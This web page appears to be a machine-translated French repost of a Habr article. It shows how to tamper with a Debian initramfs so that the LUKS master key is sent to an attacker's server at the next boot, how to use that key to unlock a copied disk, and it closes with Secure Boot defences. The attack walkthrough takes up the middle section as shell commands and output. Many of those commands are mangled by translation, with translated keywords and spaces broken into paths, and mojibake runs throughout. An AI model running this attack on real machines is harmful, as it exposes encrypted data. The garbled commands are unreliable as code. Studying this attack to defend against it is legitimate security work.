<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë©üèø‚Äçü§ù‚Äçüë®üèæ üëã üëµüèø Piratage et protection des lecteurs de chiffrement LUKS ü•ã üë©üèº‚Äçüé§ üéÖüèΩ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Le chiffrement du disque est con√ßu pour prot√©ger les donn√©es de votre ordinateur contre tout acc√®s physique non autoris√©. Il existe une id√©e fausse tr...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Piratage et protection des lecteurs de chiffrement LUKS</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/457542/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/uh/iv/cn/uhivcnz6kt37qsazxa18qmvw5am.png"></div><br>  Le chiffrement du disque est con√ßu pour prot√©ger les donn√©es de votre ordinateur contre tout acc√®s physique non autoris√©.  Il existe une id√©e fausse tr√®s r√©pandue selon laquelle le chiffrement du disque r√©pond vraiment √† cette t√¢che, et les sc√©narios dans lesquels cela ne semble pas trop exotique et irr√©aliste.  Cet article montre que l'extraction de la cl√© principale d'un volume <abbr title="Configuration de cl√© unifi√©e Linux, cryptage de disque Linux standard">LUKS</abbr> chiffr√© est facilement r√©alisable dans la pratique, et une m√©thode de protection (il y a longtemps) est propos√©e. <a name="habracut"></a><br><br><h2>  L'essence du probl√®me </h2><br>  Nous devons √©galement nous attarder sur l'objectif du chiffrement du disque.  En effet, lorsque l'acc√®s physique est impossible et que le syst√®me en cours d'ex√©cution d√©tient les donn√©es, il n'y a aucun probl√®me.  Il peut y avoir des probl√®mes avec la s√©curit√© du syst√®me lui-m√™me, mais le chiffrement du disque n'aidera pas ici.  Le chiffrement de disque doit prot√©ger les donn√©es lorsqu'une personne curieuse a la possibilit√© d'acc√©der aux disques sans passer par le syst√®me, par exemple en connectant physiquement des disques √† leur syst√®me ou en chargeant leur syst√®me d'exploitation sur un ordinateur inspect√©.  <u>Un sc√©nario d'acc√®s physique est le seul sc√©nario dans lequel le chiffrement de disque a un sens.</u> <br><br>  Le probl√®me est que l'attaquant peut intervenir discr√®tement dans la cha√Æne de d√©marrage du syst√®me d'exploitation et forcer le syst√®me √† √©mettre des cl√©s de chiffrement d√®s qu'il les re√ßoit au prochain d√©marrage. <br><br>  Une telle attaque ne n√©cessite qu'un seul acc√®s √† l'ordinateur: les donn√©es du disque peuvent √™tre copi√©es avec la substitution du circuit de d√©marrage, puis d√©crypt√©es par eux jusqu'√† ce que la cl√© apparaisse.  Par rapport aux disques non chiffr√©s, le seul inconv√©nient est que vous devez prendre soin de la fa√ßon dont la cl√© est transmise et attendre qu'elle d√©marre. <br><br>  Ensuite, nous passons √† la d√©monstration d'une telle technique dans la pratique.  Il peut s'av√©rer que pour sa mise en ≈ìuvre, l'attaquant aura besoin de moins d'efforts que le propri√©taire du syst√®me a d√©pens√© pour configurer certaines de ses m√©thodes exotiques de d√©verrouillage de disques (par exemple, √† distance). <br><br><h2>  D√©monstration pratique </h2><br>  Je ferai une d√©monstration sur l'exemple d'une machine virtuelle avec Debian 9, sur laquelle le chiffrement de disque a √©t√© activ√© lors de l'installation du syst√®me. <br><br>  L'installation de Debian 9 avec chiffrement cr√©e une partition de d√©marrage et une partition avec LVM chiffr√©.  Capture d'√©cran du syst√®me install√© demandant le mot de passe de d√©chiffrement pour plus de clart√©: <br><br><img src="https://habrastorage.org/webt/m5/j-/rx/m5j-rx32dzl9uwbvq9x28_8e8da.png"><br><br>  Tout est pr√™t, vous pouvez continuer.  √âteignez la voiture, copiez le disque.  Dans mon cas, cela ressemble √† ceci: <br><br><pre> [root @ dt1 ~] # virsh d√©truit debian9-boothack 
 Le domaine debian9-boothack est d√©truit<font></font>
<font></font>
 [root @ dt1 ~] # cp -v /var/lib/libvirt/images/debian9-boothack.qcow2 ~
 '/var/lib/libvirt/images/debian9-boothack.qcow2' -&gt; '/root/debian9-boothack.qcow2'
</pre><br><br>  Montez le lecteur de la machine, extrayez l'initramdrive: <br><br><pre> [root @ dt1 ~] # mkdir / guest
 [root @ dt1 ~] # guestmount -a /var/lib/libvirt/images/debian9-boothack.qcow2 -m / dev / sda1 / guest
 [root @ dt1 ~] # cp -v /guest/initrd.img-4.9.0-9-amd64 ~ user / tmp
 '/guest/initrd.img-4.9.0-9-amd64' -&gt; '/home/user/tmp/initrd.img-4.9.0-9-amd64'
</pre><br><br>  D√©ballez initramdrive: <br><br><pre> [utilisateur @ dt1 tmp] $ mkdir d√©compress√©
 [utilisateur @ dt1 tmp] $ cd d√©compress√© /
 [utilisateur @ dt1 d√©compress√©] $ zcat ../initrd.img-4.9.0-9-amd64 |  cpio -idm
 [utilisateur @ dt1 d√©compress√©] $ ls
 bin conf etc init lib lib64 ex√©cuter des scripts sbin
</pre><br>  Termin√©, vous pouvez modifier initramdrive.  Sachant que la machine dispose d'une connexion r√©seau permanente, je souhaite organiser l'envoi crypt√© de la cl√© principale apr√®s ouverture des disques.  Pour ce faire, il me faudra: <br><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Utilitaire pour l'envoi crypt√© sur le r√©seau</a> .  Ajoutez-le √† <code>/sbin</code> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Script shell pour l'extraction et l'envoi de cl√©s</a> .  Envoy√© √† <code>/scripts/local-top</code> et ajout√© √† la liste <code>/scripts/local-top/ORDER</code> apr√®s <code>cryptoroot</code> . </li><li>  Le <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">script de traitement d'√©v√©nement udhcpc natif</a> manquant pour d√©marrer le r√©glage automatique du r√©seau directement dans ramdrive, √† l'aide des outils int√©gr√©s.  Sa place l√©gitime est dans <code>/etc/udhcpc/default.script</code> </li></ol><br>  L'ex√©cutable secsend est construit statiquement pour √©liminer les d√©pendances sur toutes les biblioth√®ques.  Dans des conditions normales, l'assemblage produit un fichier de sortie de 2,7 Mo, ce qui est assez notable par rapport √† la taille du ramdrive - 62 m√©gaoctets sous forme d√©compress√©e et 20 en format compress√©.  Cependant, lors de la construction de toutes les biblioth√®ques et de l'ex√©cutable avec une libl musl minimale, la taille du fichier de sortie est ~ 250 Ko et 120 Ko apr√®s la compression UPX.  Secsend lui-m√™me lit simplement l'entr√©e standard, la crypte avec cryptobox depuis libsodium en utilisant la cl√© publique sp√©cifi√©e Curve25519 et envoie des donn√©es √† l'adresse sp√©cifi√©e via TCP.  Son utilisation est sans principes dans le but principal de la d√©monstration, cela montre plut√¥t que l'attaquant est essentiellement illimit√©: vous pouvez ex√©cuter du code qui fait ce que l'attaquant veut et comment il le veut. <br><br>  Apr√®s avoir ajout√© ces trois fichiers et en avoir √©dit√© un autre, vous pouvez tout replacer et remettre le fichier modifi√© √† sa place: <br><br><pre> [utilisateur @ dt1 d√©compress√©] $ find.  |  cpio -o -c |  gzip -9&gt; ../initrd.img-4.9.0-9-amd64
 125736 blocs
 [utilisateur @ dt1 d√©compress√©] $ sudo cp -v ../initrd.img-4.9.0-9-amd64 / guest
 '../initrd.img-4.9.0-9-amd64' -&gt; '/guest/initrd.img-4.9.0-9-amd64'
 [utilisateur @ dt1 d√©compress√©] $ sudo guestunmount / guest
</pre><br>  Il faudra un certain serveur pour recevoir une cl√© principale chiffr√©e, comme celle- <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ci</a> (Python 3.5.3+).  En le lan√ßant avec la partie secr√®te de la paire de cl√©s, on attend que la victime conditionnelle allume son ordinateur: <br><br><img src="https://habrastorage.org/webt/wh/xw/9w/whxw9wbsdwttyxc1r-updulgwvi.png"><br><br>  Lorsque vous allumez une machine virtuelle avec un disque chiffr√©, tout semble comme d'habitude, rien n'a chang√©: <br><br><img src="https://habrastorage.org/webt/xv/uj/wa/xvujwaegiz6gfxzgjq5bjeoy81g.png"><br><br>  Mais du c√¥t√© de l'√©couteur de connexion, une cl√© principale secr√®te est apparue: <br><br><img src="https://habrastorage.org/webt/58/ah/3_/58ah3_xgbux8-46m1dbwsy5ovg0.png"><br><br>  A partir de ce moment, la machine virtuelle avec des donn√©es et son utilisateur connaissant le mot de passe de chiffrement ne pr√©sentent plus d'int√©r√™t pour l'attaquant.  Je souligne que la modification d'une phrase secr√®te ne modifie pas la cl√© principale avec laquelle le volume entier est chiffr√©.  M√™me si un changement de phrase secr√®te se d√©roule d'une mani√®re ou d'une autre entre la cr√©ation d'une copie et l'envoi de la cl√©, ce n'est pas un obstacle.  Nous utiliserons la cl√© principale pour ouvrir le volume.  Pour ce faire, nous convertissons son entr√©e de journal √† 16 d√©cimales en un fichier binaire: <br><br><pre> [root @ dt1 ~] # echo 'fa0c53 *********** 4bd8c' |  xxd -r -p&gt; master.key
</pre><br>  Montez les disques avec une copie: <br><br><pre> [root @ dt1 ~] # modprobe nbd max_part = 8
 [root @ dt1 ~] # qemu-nbd --connect = / dev / nbd0 /root/debian9-boothack.qcow2 
 [root @ dt1 ~] # ls / dev / nbd0 *
 / dev / nbd0 / dev / nbd0p1 / dev / nbd0p2 / dev / nbd0p5
 [root @ dt1 ~] # fichier -s / dev / nbd0p5
 / dev / nbd0p5: fichier chiffr√© LUKS, ver 1 [aes, xts-plain64, sha256] UUID: fb732477-ef98-40b5-86a2-8526c349f031
 [root @ dt1 ~] # cryptsetup --master-key-file = master.key luksOpen / dev / nbd0p5 crackeddisk
 [root @ dt1 ~] # pvs
   PV VG Fmt Attr PSize PFree
   / dev / mapper / crackeddisk debian9-boothack-vg lvm2 a-- 19.75g 0 
   / dev / sda3 dt1 lvm2 a-- &lt;215.01g 8.00m
 [root @ dt1 ~] # lvs
   LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy% Sync Convert
   racine debian9-boothack-vg -wi-a ----- 18,75 g                                                    
   swap_1 debian9-boothack-vg -wi-a ----- 1,00g                                                    
   racine dt1 -wi-ao ---- 215.00g                                                    
 [root @ dt1 ~] # mkdir / hackedroot
 [root @ dt1 ~] # mount / dev / mapper / debian9 - boothack - vg-root / hackedroot /
 [root @ dt1 ~] # ls / hackedroot /
 bin boot dev etc home initrd.img initrd.img.old lib lib64 perdu + m√©dia trouv√© mnt opt ‚Äã‚Äãproc root run sbin srv sys tmp usr var vmlinuz vmlinuz.old
 [root @ dt1 ~] # cat / hackedroot / etc / hostname 
 debian9-boothack
</pre><br>  Les donn√©es sont r√©cup√©r√©es. <br><br><h2>  Mesures de protection </h2><br>  Comme vous pouvez le conclure, la racine du probl√®me est le lancement de code non fiable.  Voici un bref aper√ßu des techniques qui devraient √™tre envisag√©es dans le contexte de ce num√©ro. <br><br><h3>  Chiffrement de la partition de d√©marrage </h3><br>  Certaines distributions offrent √©galement cette fonctionnalit√© lors de l'installation (par exemple, OpenSuSE).  Dans ce cas, la partition de d√©marrage est d√©chiffr√©e par le chargeur de d√©marrage, puis le noyau et initramdrive sont charg√©s √† partir de celui-ci.  Cette approche n'a pas beaucoup de sens pour les raisons suivantes: <br><br><ul><li>  Le probl√®me le plus important avec l'usurpation de code reste toujours ouvert.  Ce n'est que maintenant que le chargeur de d√©marrage devra √™tre remplac√©. </li><li>  Pour une partition de d√©marrage, l'int√©grit√© des donn√©es n'est pas plus importante, mais l'int√©grit√© des donn√©es.  LUKS Basic Encryption ne fournit pas une telle garantie.  Un avantage ici r√©side uniquement dans le fait qu'il est difficile de former une substitution significative sur une telle partition chiffr√©e. </li><li>  Et le chiffrement LUKS2 avec v√©rification d'int√©grit√© (dm-int√©grit√©) ne prot√®ge pas non plus contre les interf√©rences, car il ne donne aucune garantie contre les attaques li√©es √† la relecture du secteur.  Par exemple, en ayant un vidage d'une telle partition et une configuration du chargeur de d√©marrage, vous pouvez toujours prendre et restaurer le noyau √† l'√©tat copi√© pr√©c√©demment.  Cela ne donne pas d'avantages sp√©cifiques dans la question de l'extraction de cl√©s (sauf si l'ancien noyau √©tait vuln√©rable et peut √™tre utilis√© d'une mani√®re ou d'une autre), c'est plut√¥t un argument en faveur de l'inutilit√© de chiffrer la partition de d√©marrage. </li></ul><br><h3>  Utilisation de TPM pour stocker une cl√© de chiffrement et valider un environnement de d√©marrage s√©curis√© </h3><br>  <abbr title="Module de plateforme s√©curis√©e">Le TPM</abbr> est essentiellement un processeur cryptographique qui agit comme une enclave s√©curis√©e ou une carte √† puce dans le syst√®me.  Les donn√©es secr√®tes chiffr√©es avec elles ne peuvent √™tre d√©chiffr√©es qu'en les utilisant et uniquement √† leurs conditions - lorsque les valeurs <abbr title="Registre de configuration de la plateforme">PCR</abbr> du syst√®me convergent, qui d√©pendent de l'√©tat de la plate-forme et du code qui y est ex√©cut√©.  La technologie est assez prometteuse et peut vous permettre d'impl√©menter un cryptage s√©curis√© dans le syst√®me sans n√©cessiter de cl√© (par exemple, en entrant avec une empreinte digitale ou des m√©thodes d'authentification sans rapport avec le cryptage).  Id√©alement, il devrait fonctionner en conjonction avec le d√©marrage s√©curis√© UEFI, interdisant le d√©chiffrement lorsque la configuration ne converge pas. <br><br>  Cependant, sous Linux, la prise en charge du TPM en est encore √† ses balbutiements.  Le chargeur de d√©marrage TrustedGRUB2 (un chargeur de d√©marrage adapt√© pour travailler avec TPM) ne prend pas en charge UEFI et tout l'int√©r√™t de l'id√©e dispara√Æt de cela.  De plus, la pr√©sence d'un TPM 2.0 fonctionnel commence √† peine √† appara√Ætre dans le mat√©riel, souvent avec les mises √† jour du BIOS.  La plupart des cartes m√®res n'ont pas de module TPM discret; au lieu de cela, le TPM est un logiciel impl√©ment√© dans Intel <abbr title="Moteur de gestion">ME</abbr> .  Pour toutes ces raisons, je ne consid√®re pas encore qu'une telle configuration fonctionne et convienne √† une utilisation g√©n√©ralis√©e. <br><br><h3>  Utilisation de UEFI Secure Boot pour couvrir enti√®rement la cha√Æne de d√©marrage avec une signature √©lectronique </h3><br>  Il existe des distributions (Fedora, OpenSuSE) et des solutions uniques qui vous permettent d'utiliser Secure Boot sous Linux.  Cependant, les solutions en bo√Æte ne fournissent souvent pas l'int√©grit√© du code dans la cha√Æne de charge.  Ils sont principalement con√ßus pour garantir que Linux d√©marre simplement lorsque le d√©marrage s√©curis√© est activ√©.  Habituellement, il suffit d'utiliser une cale EFI, sign√©e par un certificat Microsoft, qui ex√©cute ensuite n'importe quoi.  Par cons√©quent, lors de l'utilisation d'une certification externe, il est tout simplement impossible de couvrir la signature d'un lecteur sur disque g√©n√©r√© directement dans le syst√®me install√©. <br><br>  Il existe des articles sur le hub qui sugg√®rent d'utiliser votre propre <abbr title="Infrastructure √† cl√© publique">PKI</abbr> pour signer le code.  Cela vous permet de signer tout ce dont vous avez besoin par vous-m√™me et de couvrir ainsi l'ensemble de la cha√Æne UEFI ‚Üí bootloader ‚Üí noyau et intramdrive. <br><br><ol><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Apprivoiser UEFI SecureBoot</a> - le premier article sur le hub sur ce sujet, tr√®s d√©taill√©. </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Nous utilisons Secure Boot sous Linux au maximum</a> - il est particuli√®rement bien expliqu√© ici pourquoi Secure Boot avec des certificats Microsoft install√©s est √©quivalent √† son absence. </li></ol><br>  Le r√©sultat recherch√© est obtenu dans le deuxi√®me article.  Une signature intramdrive est obtenue en fusionnant le ramdrive et le noyau en une seule application EFI, sans utiliser de chargeur, et UEFI v√©rifie directement la signature imm√©diatement en bloc.  Les deux manuels n√©cessitent beaucoup de travail manuel sur chaque syst√®me prot√©g√©. <br><br><h2>  Solution abordable </h2><br>  J'ai propos√© une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">approche pour la mise en ≈ìuvre compl√®te de Secure Boot, compatible avec le sch√©ma de d√©marrage g√©n√©ralement accept√©</a> et ne n√©cessitant pas d'intervention s√©rieuse dans le syst√®me: un chargeur de d√©marrage s√©par√©, un lecteur RAM s√©par√©, un noyau s√©par√©.  UEFI ne v√©rifie que la signature du chargeur de d√©marrage GRUB2, le chargeur de d√©marrage a une configuration filaire avec la cl√© pour v√©rifier la signature et le mot de passe administrateur, puis v√©rifie le noyau et le ramdrive.  Le chargeur de d√©marrage sign√© est install√© en parall√®le avec l'ancien et, si n√©cessaire, il reste possible de d√©marrer de la mani√®re habituelle en d√©sactivant le d√©marrage s√©curis√©.  Bien s√ªr, cette fonction doit √™tre ferm√©e par le mot de passe administrateur dans le menu des param√®tres UEFI. <br><br>  J'ai d√©cid√© d'automatiser le processus de d√©ploiement Secure Boot avec ma propre PKI et de le rendre aussi simple et ind√©pendant de la distribution que possible.  Le r√©sultat est exactement un tel ensemble de la recette Makefile et des utilitaires: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">https://github.com/Snawoot/linux-secureboot-kit</a> .  Pour debian, ubuntu, fedora et centos, l'ensemble du processus ne n√©cessite que quelques commandes. <br><br>  Plus pr√©cis√©ment, avec l'exemple de Debian 9, l'installation ressemble √† ceci (en supposant que UEFI est d√©j√† en mode configuration): <br><br><pre> <code class="bash hljs">apt update &amp;&amp; apt install -y unzip make sbsigntool wget https://gist.github.com/Snawoot/1937d5bc76d7b0a29f2039aa679c0449/raw/74a63c99be07ec93cfc1df47d2e98e54920c97b7/efitools-1.9.2-static.tar.xz &amp;&amp; \ tar xpJf efitools-1.9.2-static.tar.xz -C / wget https://github.com/Snawoot/linux-secureboot-kit/archive/master.zip unzip master.zip <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> linux-secureboot-kit-master/ make debian9-install</code> </pre><br>  Ici, toutes les commandes sont entr√©es au nom du superutilisateur.  Par cons√©quent, il ne reste plus qu'√† v√©rifier que le d√©marrage s√©curis√© est activ√© dans le menu BIOS et √† prot√©ger les param√®tres du BIOS avec un mot de passe administrateur. <br><br>  Et voici la tentative de remplacer le ramdrive sur une telle installation: <br><br><img src="https://habrastorage.org/webt/0x/e5/gy/0xe5gyuh68ohcjwwjr4mfd2ijuc.png"><br><br>  Remplacement du chargeur de d√©marrage (l'apparence d√©pend de la plate-forme): <br><br><img src="https://habrastorage.org/webt/pg/mb/_u/pgmb_uuuwo-acrteotkjoasaepm.png"><br><br><h2>  R√©sum√© </h2><br>  Le chiffrement du disque seul ne suffit pas pour garantir la confidentialit√© des donn√©es.  La signature de toute la cha√Æne de d√©marrage √† l'aide de UEFI Secure Boot et GPG vous permet d'obtenir un bon niveau de protection contre l'usurpation de code ex√©cutable, √† condition que l'op√©rateur informatique soit capable de reconna√Ætre une r√©initialisation ou une usurpation de la carte syst√®me, ou m√™me de tout l'ordinateur.  Sinon, il est extr√™mement difficile d'offrir des m√©thodes de protection ad√©quates si l'utilisateur est pr√™t √† saisir le mot de passe / √† transf√©rer la cl√© sur une machine qui se retrouve accidentellement sur la table ou dans la salle des serveurs. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr457542/">https://habr.com/ru/post/fr457542/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr457526/index.html">Les m√©dias techniques comme bazar</a></li>
<li><a href="../fr457532/index.html">Il est grand temps de faire partie d'un projet open source</a></li>
<li><a href="../fr457534/index.html">Versions certifi√©es - le r√¢teau que nous choisissons</a></li>
<li><a href="../fr457538/index.html">Comment puis-je utiliser des machines virtuelles Yandex.Cloud interrompues et √©conomiser sur la r√©solution de probl√®mes √† grande √©chelle</a></li>
<li><a href="../fr457540/index.html">Intel Optane DC Persistent Memory, un an plus tard</a></li>
<li><a href="../fr457546/index.html">Demo Day: pourquoi tout cela et comment le faire UPD + Broadcast</a></li>
<li><a href="../fr457548/index.html">G√©n√©ration de signal PWM multiphas√© sur TMS320F28027</a></li>
<li><a href="../fr457550/index.html">De quoi l'industrie num√©rique doit-elle √™tre prot√©g√©e</a></li>
<li><a href="../fr457552/index.html">Grimpeurs √† Zafasadia. Comment fonctionnent les promalps de la tour du centre de Lakhta</a></li>
<li><a href="../fr457558/index.html">Analyse de vuln√©rabilit√© EvilParcel</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>